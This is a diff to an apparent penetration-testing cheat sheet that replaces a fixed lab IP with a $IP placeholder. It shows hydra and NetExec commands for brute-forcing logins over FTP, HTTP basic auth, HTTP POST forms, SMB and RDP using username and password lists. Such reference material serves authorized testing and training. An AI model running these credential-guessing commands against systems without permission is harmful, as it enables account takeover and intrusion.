@@ -10,24 +10,24 @@
 
 ## Hydra
 !!! tip "Non-Standart Port"
-    Found a service running on a non-standard port? Use `-s x` to signify the port to work with hydra's built-in protocol tools. Example: `hydra -s 2121 -L users.list -P passwords.list ftp://10.10.10.10`
+    Found a service running on a non-standard port? Use `-s x` to signify the port to work with hydra's built-in protocol tools. Example: `hydra -s 2121 -L users.list -P passwords.list ftp://$IP`
 
 ### HTTP Basic Authentication
 
 ```bash
-hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 10.10.10.10 http-get
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt $IP http-get
 ```
 
 ### HTTP POST Form
 
 ```bash
-hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
+hydra -L users.txt -P passwords.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
 ```
 
 ### SMB
 
 ```bash
-hydra -L users.txt -P passwords.txt smb://10.10.10.10
+hydra -L users.txt -P passwords.txt smb://$IP
 ```
 
 ---
@@ -37,19 +37,19 @@ hydra -L users.txt -P passwords.txt smb://10.10.10.10
 ### Web Authentication
 
 ```bash
-nxc http 10.10.10.10 -u users.txt -p passwords.txt --auth-form /login.php
+nxc http $IP -u users.txt -p passwords.txt --auth-form /login.php
 ```
 
 ### SMB
 
 ```bash
-nxc smb 10.10.10.10 -u users.txt -p passwords.txt
+nxc smb $IP -u users.txt -p passwords.txt
 ```
 
 ### RDP
 
 ```bash
-nxc rdp 10.10.10.10 -u users.txt -p passwords.txt
+nxc rdp $IP -u users.txt -p passwords.txt
 ```
 
 ---
